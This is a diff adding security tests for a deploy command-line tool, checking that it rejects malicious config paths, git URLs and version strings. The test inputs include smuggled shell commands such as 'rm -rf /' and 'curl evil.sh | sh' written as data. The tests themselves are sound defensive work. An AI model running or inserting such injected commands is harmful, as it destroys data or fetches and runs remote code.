@@ -1,5 +1,10 @@
 """Security tests for lich deploy: no shell=True, validated inputs, quoted scripts."""
 import pytest
+import yaml
+from typer.testing import CliRunner
+from pathlib import Path
+
+from lich.cli import app
 
 
 class TestVerifyGithubAccess:
@@ -42,3 +47,60 @@ class TestVerifyGithubAccess:
         from lich.commands.deploy import _verify_github_access
 
         assert _verify_github_access("git@github.com:acme/app.git", "/tmp/key") is False
+
+
+def _write_deploy_config(project_dir: Path, path_value: str, git_repo: str = "git@github.com:acme/app.git"):
+    lich_dir = project_dir / ".lich"
+    lich_dir.mkdir(exist_ok=True)
+    config = {
+        "production": {
+            "connection": "manual",
+            "host": "192.0.2.10",
+            "user": "root",
+            "path": path_value,
+            "runtime": "docker-compose",
+        },
+        "git_repo": git_repo,
+    }
+    (lich_dir / "deploy.yml").write_text(yaml.dump(config))
+
+
+class TestDeployConfigValidation:
+    def test_deploy_init_rejects_malicious_path(self, runner: CliRunner, temp_dir: Path, monkeypatch):
+        monkeypatch.chdir(temp_dir)
+        (temp_dir / "backend").mkdir()
+        _write_deploy_config(temp_dir, '/opt/app"; rm -rf / #')
+
+        result = runner.invoke(app, ["deploy", "init", "production"])
+        assert result.exit_code == 1
+        assert "Invalid" in result.output
+
+    def test_deploy_init_rejects_malicious_git_url(self, runner: CliRunner, temp_dir: Path, monkeypatch):
+        monkeypatch.chdir(temp_dir)
+        (temp_dir / "backend").mkdir()
+        _write_deploy_config(temp_dir, "/opt/app", git_repo="git@github.com:a/b.git && curl evil.sh | sh")
+
+        result = runner.invoke(app, ["deploy", "init", "production"])
+        assert result.exit_code == 1
+        assert "Invalid" in result.output
+
+    def test_deploy_prod_rejects_malicious_version(self, runner: CliRunner, temp_dir: Path, monkeypatch):
+        monkeypatch.chdir(temp_dir)
+        (temp_dir / "backend").mkdir()
+        _write_deploy_config(temp_dir, "/opt/app")
+
+        result = runner.invoke(
+            app,
+            ["deploy", "prod", "backend", "--force", "--version", "v1; rm -rf /"],
+        )
+        assert result.exit_code == 1
+        assert "Invalid" in result.output
+
+    def test_deploy_prod_rejects_malicious_config_path(self, runner: CliRunner, temp_dir: Path, monkeypatch):
+        monkeypatch.chdir(temp_dir)
+        (temp_dir / "backend").mkdir()
+        _write_deploy_config(temp_dir, "$(curl evil.sh)")
+
+        result = runner.invoke(app, ["deploy", "prod", "backend", "--force"])
+        assert result.exit_code == 1
+        assert "Invalid" in result.output
